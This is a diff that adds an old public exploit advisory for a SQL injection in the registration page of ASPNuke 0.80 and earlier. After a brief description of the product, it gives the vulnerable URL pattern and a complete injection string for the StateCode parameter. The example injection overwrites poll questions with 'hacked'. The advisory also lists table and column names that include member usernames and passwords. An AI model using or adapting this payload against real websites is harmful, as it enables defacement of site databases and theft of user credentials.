@@ -1,0 +1,57 @@
+*******************************************************************************
+# Title  :  ASPNuke <= 0.80 (register.asp) Remote SQL Injection Vulnerability
+# Author :  ajann
+# S.Page :  http://www.aspnuke.com
+# D.Page :  http://sourceforge.net/project/showfiles.php?group_id=92470
+
+*******************************************************************************
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ASP Nuke
+Kenneth W. Richards
+Orvado Technologies
+-Introduction-
+
+ASP Nuke is an open-source software application for running a
+community-based web site on a web server.
+By open-source, we mean the code is freely available for others to read,
+modify and use in accordance
+with the software license.
+ASP Nuke is an extensible framework that allows you to upgrade and add
+applications to the website quickly
+and easily. It uses a modular architecture allowing others to rapidly
+develop new modules and site operators
+to re-organize the layout and navigation for their site.
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Vulnerability::
+_________________
+
+###http://[target]/[path]//module/account/register/register.asp?StateCode=[SQL]&..&..&..&..&..&..&..&..&....
+
+Example = Poll Update
+
+///module/account/register/register.asp?StateCode=0',0,0,0,0,0);update%20tblPoll%20set%20Question%20=%20'hacked'--&FirstName=namename1&LastName=namename2&Username=abcdefghijk&Password=1234567890&Confirm=1234567890&Address1=kro.mahallesi&Address2=kro.apt&City=aaaaaaaaa&ZipCode=101010101&CountryID=0&Email=mailmail@mailbidaamail.com&Action=ADD&_dummy=Register
+
+Note: Change UserName because ; failed:already username dont write.
+
+Some tables,columns
+___________________
+
+[tblMember]    |  [FaqQuestion]
+MemberID       |  QuestionID
+Username       |  DocumentID
+Password       |  Question
+Firstname      |  Answer
+Middlename     |  Active
+EmailAddress   |  OrderNo
+..             |  ..
+
+
+"""""""""""""""""""""
+# ajann,Turkey
+# ...
+
+# Im not Hacker!
+
+# milw0rm.com [2006-11-19]
